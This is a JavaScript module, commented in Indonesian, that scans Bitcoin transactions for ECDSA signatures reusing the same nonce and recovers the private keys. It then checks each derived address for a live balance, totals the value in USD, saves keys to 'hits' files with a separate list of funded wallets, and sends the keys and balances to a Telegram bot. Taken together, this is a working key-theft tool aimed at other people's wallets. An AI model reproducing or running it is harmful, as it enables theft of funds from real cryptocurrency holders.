import { CONFIG, DEFAULT_API } from "./config.js";
import { logScan } from "./log.js";
import { hexToBytes, bytesToHex, bytesToBigInt, padHex } from "./bytes.js";
import { hash160, pubkeysFromPriv } from "./hash.js";
import { sep, box, c, C, ICON } from "./ui.js";
import { parseDER, parseScriptPushes, parseTx } from "./tx.js";
import { legacySighash, bip143Sighash } from "./sighash.js";
import { p2pkhAddress, p2wpkhAddress, p2shP2wpkhAddress, toWIF } from "./address.js";
import { recoverPrivateKey } from "./ecdsa.js";
import { esploraFetch } from "./net.js";
import { fetchTxHexCached, appendHit } from "./cache.js";
import { fetchAddressBalance, formatBTC, fetchBtcUsdPrice, formatUSD } from "./price.js";
import { notifyTelegram } from "./telegram.js";

// ============================================================
// Helpers
// ============================================================

// scriptCode P2PKH (25 byte): OP_DUP OP_HASH160 <20-byte hash> OP_EQUALVERIFY OP_CHECKSIG
// Pre-allocated agar tidak alokasi 4 buffer per input (3 concat + 1 hasil).
function buildScriptCodeP2PKH(pubHash) {
  const out = new Uint8Array(25);
  out[0] = 0x76; out[1] = 0xa9; out[2] = 0x14;
  out.set(pubHash, 3);
  out[23] = 0x88; out[24] = 0xac;
  return out;
}

// ============================================================
// Pagination address (Esplora)
// ============================================================
export async function fetchAllTxsForAddress(base, address) {
  const all = [];
  let lastSeen = null;
  let page = 0;
  while (true) {
    page++;
    const path = lastSeen
      ? "/address/" + address + "/txs/chain/" + lastSeen
      : "/address/" + address + "/txs";
    let data;
    try {
      data = await esploraFetch(base, path);
    } catch (e) {
      process.stdout.write("\n");
      console.log(c(C.yellow, "  ! Pagination berhenti di halaman " + page +
        " (" + e.message + "). Lanjut dengan " + all.length + " tx yang sudah didapat."));
      logScan("WARN", "pagination[" + address + "] berhenti di halaman " + page + " sisa belum dimuat · " + e.message);
      break;
    }
    if (!Array.isArray(data) || data.length === 0) break;
    for (const tx of data) {
      if (tx && tx.txid) all.push(tx);
    }
    process.stdout.write("\r" + c(C.dim, "  paginasi: " + all.length + " tx dimuat (halaman " + page + ")") + "\x1b[K");
    if (lastSeen && data.length < 25) break;
    lastSeen = data[data.length - 1].txid;
  }
  process.stdout.write("\n");
  return all;
}

// ============================================================
// Ekstrak signature dari semua input tx (atau subset bila inputFilter diberi).
// Mengganti dua fungsi lama (processTxForAddress + processTxAllInputs).
// ============================================================
export async function processTxInputs(tx, base, opts = {}) {
  const inputFilter = opts.inputFilter || null;
  const defaultAddress = opts.defaultAddress || null;

  let inputIdxs;
  if (inputFilter) {
    inputIdxs = [];
    for (let i = 0; i < tx.vin.length; i++) {
      if (inputFilter(tx.vin[i], i)) inputIdxs.push(i);
    }
    if (inputIdxs.length === 0) return { sigs: [], err: null };
  }

  let hex;
  try { hex = await fetchTxHexCached(base, tx.txid); }
  catch (e) { return { sigs: [], err: "ambil " + tx.txid + ": " + e.message }; }
  let parsed;
  try { parsed = parseTx(hexToBytes(hex.trim())); }
  catch (e) { return { sigs: [], err: "parse " + tx.txid + ": " + e.message }; }

  if (!inputFilter) {
    inputIdxs = new Array(parsed.vin.length);
    for (let i = 0; i < parsed.vin.length; i++) inputIdxs[i] = i;
  }

  const out = [];
  for (const i of inputIdxs) {
    const vi = parsed.vin[i];
    let pushes = parseScriptPushes(vi.scriptSig);
    let isWitness = false;
    if (pushes.length < 2 && vi.witness.length >= 2) { pushes = vi.witness; isWitness = true; }
    if (pushes.length < 2) continue;

    let der;
    try { der = parseDER(pushes[0]); } catch { continue; }
    const pub = pushes[1];
    const pubHash = hash160(pub);
    const sht = der.sighashType == null ? 1 : der.sighashType;

    let z = null;
    try {
      const scriptCode = buildScriptCodeP2PKH(pubHash);
      if (isWitness) {
        const meta = tx.vin && tx.vin[i] && tx.vin[i].prevout;
        const amt = meta && meta.value;
        if (amt == null) continue;
        z = bytesToBigInt(bip143Sighash(parsed, i, scriptCode, amt, sht));
      } else {
        z = bytesToBigInt(legacySighash(parsed, i, scriptCode, sht));
      }
    } catch { continue; }

    let address = defaultAddress;
    if (!address) {
      const meta = tx.vin && tx.vin[i] && tx.vin[i].prevout;
      address = (meta && meta.scriptpubkey_address) || p2pkhAddress(pubHash);
    }

    out.push({
      txid: tx.txid, inputIndex: i,
      r: der.r, s: der.s, z,
      pubkey: bytesToHex(pub),
      pubkeyHash: bytesToHex(pubHash),
      address,
    });
  }
  return { sigs: out, err: null };
}

// Wrapper backward-compatible.
export function processTxForAddress(tx, address, base) {
  return processTxInputs(tx, base, {
    defaultAddress: address,
    inputFilter: (vin) => vin.prevout && vin.prevout.scriptpubkey_address === address,
  });
}

export function processTxAllInputs(tx, base) {
  return processTxInputs(tx, base);
}

// ============================================================
// Concurrency limiter umum.
// Bila worker melempar exception tak terduga, hasil = undefined dan
// callback `onError` (opsional) dipanggil. Tidak menyuntikkan struktur
// {sigs,err} agar reusable lintas pemanggil.
// ============================================================
export async function runWithConcurrency(items, limit, worker, onProgress, onError) {
  const results = new Array(items.length);
  let next = 0;
  let done = 0;
  async function spawn() {
    while (true) {
      const i = next++;
      if (i >= items.length) return;
      try {
        results[i] = await worker(items[i], i);
      } catch (e) {
        results[i] = undefined;
        if (onError) { try { onError(e, items[i], i); } catch {} }
      }
      done++;
      if (onProgress) { try { onProgress(done, items[i]); } catch {} }
    }
  }
  const workers = Array.from({ length: Math.min(limit, items.length) }, spawn);
  await Promise.all(workers);
  return results;
}

// ============================================================
// Formatter teks hit (dipakai untuk hits.txt & hits_LIVE.txt)
// ============================================================
function formatHitText(h, opts = {}) {
  const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
  const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
  const liveS = h.balanceSegwit && h.balanceSegwit.balanceSat > 0;
  const liveP = h.balanceP2sh && h.balanceP2sh.balanceSat > 0;
  const isLive = liveC || liveU || liveS || liveP;
  const banner = (opts.forceLiveBanner || isLive) ? "  *** WALLET MASIH ADA SALDO ***" : "";

  const lines = [];
  lines.push("==========================================================" + banner);
  lines.push("Waktu              : " + h.ts);
  if (h.scannedAddress) lines.push("Address yang di-scan: " + h.scannedAddress);
  lines.push("Private key (hex)  : " + h.privHex);
  lines.push("WIF (compressed)   : " + h.wifCompressed);
  lines.push("WIF (uncompressed) : " + h.wifUncompressed);
  lines.push("Public key         : " + h.pubkey);

  const addrBlock = (label, addr, bal) => {
    lines.push(label + " : " + addr);
    if (bal) {
      lines.push("  Saldo            : " + formatBTC(bal.balanceSat));
      lines.push("  Total diterima   : " + formatBTC(bal.totalReceivedSat));
      lines.push("  Jumlah tx        : " + bal.txCount);
    }
  };
  addrBlock("Address P2PKH comp ", h.addressCompressed,   h.balanceCompressed);
  addrBlock("Address P2PKH uncm ", h.addressUncompressed, h.balanceUncompressed);
  addrBlock("Address P2WPKH bc1 ", h.addressSegwit,       h.balanceSegwit);
  addrBlock("Address P2SH-WPKH  ", h.addressP2sh,         h.balanceP2sh);

  lines.push("R reuse value      : " + h.r);
  lines.push("TXID terkait       : " + (h.txids || []).join(", "));
  lines.push("");
  return { text: lines.join("\n"), isLive };
}

// ============================================================
// Deteksi R-reuse + pemulihan private key
// ============================================================
export async function detectReuse(sigs, opts = {}) {
  sep(opts.crossAddressOnly ? "Deteksi R-reuse LINTAS ADDRESS" : "Deteksi R-reuse");
  const hitsFile = opts.hitsFile || "hits.txt";
  const groups = new Map();
  for (const s of sigs) {
    const key = padHex(s.r);
    if (!groups.has(key)) groups.set(key, []);
    groups.get(key).push(s);
  }

  let found = false;
  let hitCount = 0;
  const recovered = [];
  for (const [r, list] of groups) {
    if (list.length < 2) continue;
    if (opts.crossAddressOnly) {
      const addrs = new Set(list.map((s) => s.address).filter(Boolean));
      if (addrs.size < 2) continue;
    }
    found = true;
    console.log(c(C.red, `\n!! R berulang ditemukan pada R = ${r}`));
    console.log("   Tanda tangan terkait:");
    for (const s of list) {
      const txStr  = s.txid ? s.txid.slice(0, 16) + "…" : "(manual)";
      const pubStr = s.pubkey ? s.pubkey.slice(0, 16) + "…" : "(no pubkey)";
      console.log(`   - input #${s.index}  tx ${txStr}  pubkey ${pubStr}`);
    }
    const seenPriv = new Set();
    for (let i = 0; i < list.length; i++) {
      for (let j = i + 1; j < list.length; j++) {
        const a = list[i], b = list[j];
        if (a.z === null || b.z === null) {
          console.log(c(C.yellow, "   (lewati: Z belum diketahui, sediakan --amount untuk segwit)"));
          continue;
        }
        const cands = recoverPrivateKey(a.r, a.s, a.z, b.s, b.z);
        for (const { k, d } of cands) {
          try {
            const dHex = padHex(d);
            if (seenPriv.has(dHex)) continue;
            const { compressed, uncompressed } = pubkeysFromPriv(dHex);
            const pubCHex = bytesToHex(compressed);
            const pubUHex = bytesToHex(uncompressed);
            if (pubCHex === a.pubkey || pubUHex === a.pubkey ||
                pubCHex === b.pubkey || pubUHex === b.pubkey) {
              seenPriv.add(dHex);
              hitCount++;
              const matchedPub = (pubCHex === a.pubkey || pubCHex === b.pubkey) ? pubCHex : pubUHex;
              const h160C = hash160(compressed);
              const addrCompressed = p2pkhAddress(h160C);
              const addrUncompressed = p2pkhAddress(hash160(uncompressed));
              const addrSegwit = p2wpkhAddress(h160C);
              const addrP2sh = p2shP2wpkhAddress(h160C);
              const wifC = toWIF(d, 0x80, true);
              const wifU = toWIF(d, 0x80, false);
              console.log();
              box(ICON.key + "  PRIVATE KEY DIPULIHKAN", [
                c(C.dim, "Nonce k       ") + " " + c(C.magenta, padHex(k)),
                c(C.dim, "Priv (hex)    ") + " " + c(C.green + C.bold, dHex),
                c(C.dim, "WIF compressed") + " " + c(C.green, wifC),
                c(C.dim, "WIF uncompres ") + " " + c(C.green, wifU),
                c(C.dim, "Pubkey match  ") + " " + matchedPub,
                c(C.dim, "Addr P2PKH c  ") + " " + c(C.green + C.bold, addrCompressed),
                c(C.dim, "Addr P2PKH u  ") + " " + c(C.green + C.bold, addrUncompressed),
                c(C.dim, "Addr P2WPKH   ") + " " + c(C.green + C.bold, addrSegwit),
                c(C.dim, "Addr P2SH-WPKH") + " " + c(C.green + C.bold, addrP2sh),
              ], C.green);
              logScan("HIT", "private-key dipulihkan scanned=" + (opts.scannedAddress || "-") +
                " priv=" + dHex + " p2pkhC=" + addrCompressed + " p2wpkh=" + addrSegwit);

              recovered.push({
                ts: new Date().toISOString(),
                scannedAddress: opts.scannedAddress || null,
                privHex: dHex,
                wifCompressed: wifC,
                wifUncompressed: wifU,
                pubkey: matchedPub,
                addressCompressed: addrCompressed,
                addressUncompressed: addrUncompressed,
                addressSegwit: addrSegwit,
                addressP2sh: addrP2sh,
                r: padHex(a.r),
                txids: [a.txid, b.txid].filter(Boolean),
                inputs: [a.index, b.index],
              });
            }
          } catch {}
        }
      }
    }
  }
  if (!found) {
    console.log(c(C.green, "Tidak ada R-reuse terdeteksi."));
    return [];
  }

  // ========== Pengecekan saldo ==========
  if (recovered.length && opts.checkBalance !== false) {
    const base = opts.api || DEFAULT_API;
    console.log();
    sep("Pengecekan Saldo (" + (recovered.length * 4) + " address di " + base + ")");
    const fmtBalance = (b, label) => {
      if (b.balanceSat == null) return c(C.red, ICON.err + " error " + label);
      const live = b.balanceSat > 0;
      const head = live
        ? ICON.money + " " + c(C.green + C.bold, formatBTC(b.balanceSat))
        : c(C.dim, "  0.00000000 BTC");
      return head + c(C.gray, "   " + label + " · diterima " + formatBTC(b.totalReceivedSat) + " · " + b.txCount + " tx");
    };
    for (const h of recovered) {
      const [bC, bU, bS, bP] = await Promise.all([
        fetchAddressBalance(base, h.addressCompressed),
        fetchAddressBalance(base, h.addressUncompressed),
        fetchAddressBalance(base, h.addressSegwit),
        fetchAddressBalance(base, h.addressP2sh),
      ]);
      h.balanceCompressed = bC;
      h.balanceUncompressed = bU;
      h.balanceSegwit = bS;
      h.balanceP2sh = bP;
      const live =
        (bC.balanceSat && bC.balanceSat > 0) ||
        (bU.balanceSat && bU.balanceSat > 0) ||
        (bS.balanceSat && bS.balanceSat > 0) ||
        (bP.balanceSat && bP.balanceSat > 0);
      const tag = live ? "  " + ICON.alert + c(C.red + C.bold, " WALLET HIDUP") : "";
      console.log(c(live ? C.green + C.bold : C.dim, "\n  " + h.addressCompressed) + tag);
      console.log("    " + fmtBalance(bC, "P2PKH compressed"));
      console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressUncompressed));
      console.log("    " + fmtBalance(bU, "P2PKH uncompressed"));
      console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressSegwit));
      console.log("    " + fmtBalance(bS, "P2WPKH (bech32)"));
      console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressP2sh));
      console.log("    " + fmtBalance(bP, "P2SH-P2WPKH (3...)"));
    }

    // Telegram notify — paralel
    if (CONFIG.telegram.enabled) {
      const onlyLive = CONFIG.telegram.notifyOnLiveOnly !== false;
      const targets = onlyLive
        ? recovered.filter((h) =>
            (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
            (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0) ||
            (h.balanceSegwit && h.balanceSegwit.balanceSat > 0) ||
            (h.balanceP2sh && h.balanceP2sh.balanceSat > 0))
        : recovered;
      const msgs = targets.map((h) => {
        const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
        const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
        const liveS = h.balanceSegwit && h.balanceSegwit.balanceSat > 0;
        const liveP = h.balanceP2sh && h.balanceP2sh.balanceSat > 0;
        const tag = (liveC || liveU || liveS || liveP) ? "🚨 *WALLET HIDUP DITEMUKAN*" : "🔑 *Private key dipulihkan*";
        return [
          tag,
          h.scannedAddress ? "Scan: `" + h.scannedAddress + "`" : null,
          "Priv (hex): `" + h.privHex + "`",
          "WIF (comp): `" + h.wifCompressed + "`",
          "P2PKH comp : `" + h.addressCompressed + "`" +
            (liveC ? " — *" + formatBTC(h.balanceCompressed.balanceSat) + "*" : ""),
          "P2PKH uncmp: `" + h.addressUncompressed + "`" +
            (liveU ? " — *" + formatBTC(h.balanceUncompressed.balanceSat) + "*" : ""),
          "P2WPKH bc1 : `" + h.addressSegwit + "`" +
            (liveS ? " — *" + formatBTC(h.balanceSegwit.balanceSat) + "*" : ""),
          "P2SH-P2WPKH: `" + h.addressP2sh + "`" +
            (liveP ? " — *" + formatBTC(h.balanceP2sh.balanceSat) + "*" : ""),
          "TXID: " + (h.txids || []).slice(0, 4).map((t) => "`" + t.slice(0, 16) + "…`").join(", "),
        ].filter(Boolean).join("\n");
      });
      await Promise.allSettled(msgs.map((m) => notifyTelegram(m)));
    }
  }

  // ========== Tulis hits ke file (stream, non-blocking) ==========
  if (recovered.length && opts.saveHits !== false) {
    try {
      const liveFile = hitsFile.replace(/\.txt$/, "") + "_LIVE.txt";
      const jsonFile = hitsFile.replace(/\.txt$/, "") + ".jsonl";
      let liveCount = 0;
      for (const h of recovered) {
        const formatted = formatHitText(h);
        appendHit(hitsFile, formatted.text);
        appendHit(jsonFile, JSON.stringify(h) + "\n");
        if (formatted.isLive) {
          appendHit(liveFile, formatHitText(h, { forceLiveBanner: true }).text);
          liveCount++;
        }
      }
      console.log(c(C.green + C.bold,
        "\n>> " + recovered.length + " hit disimpan ke: " + hitsFile + " (dan " + jsonFile + ")"));
      if (liveCount > 0) {
        console.log(c(C.green + C.bold,
          ">> " + liveCount + " wallet HIDUP juga disalin ke: " + liveFile));
      }
    } catch (e) {
      console.log(c(C.red, "Gagal menulis hits file: " + e.message));
    }
  }

  // ========== Ringkasan total ==========
  if (recovered.length && opts.checkBalance !== false) {
    let totalSat = 0n;
    let liveWallets = 0;
    for (const h of recovered) {
      const slots = [h.balanceCompressed, h.balanceUncompressed, h.balanceSegwit, h.balanceP2sh];
      let perKey = 0n;
      for (const b of slots) {
        if (b && b.balanceSat && b.balanceSat > 0) perKey += BigInt(b.balanceSat);
      }
      if (perKey > 0n) liveWallets++;
      totalSat += perKey;
    }
    const totalBtc = Number(totalSat) / 1e8;
    const usd = await fetchBtcUsdPrice();
    const usdVal = usd ? totalBtc * usd : null;
    console.log();
    box(ICON.money + "  RINGKASAN TOTAL", [
      c(C.dim, "Kunci dipulihkan ") + " " + c(C.bold, String(recovered.length)),
      c(C.dim, "Wallet hidup     ") + " " + c(liveWallets > 0 ? C.green + C.bold : C.dim, String(liveWallets)),
      c(C.dim, "Total saldo (BTC)") + " " +
        (totalSat > 0n ? c(C.green + C.bold, formatBTC(Number(totalSat))) : c(C.dim, "0.00000000 BTC")),
      c(C.dim, "Harga BTC/USD    ") + " " + (usd ? c(C.cyan, formatUSD(usd)) : c(C.yellow, "tidak tersedia")),
      c(C.dim, "Nilai total (USD)") + " " +
        (usdVal != null ? c(C.green + C.bold, formatUSD(usdVal)) : c(C.dim, "—")),
    ], totalSat > 0n ? C.green : C.gray);
  }

  return recovered;
}
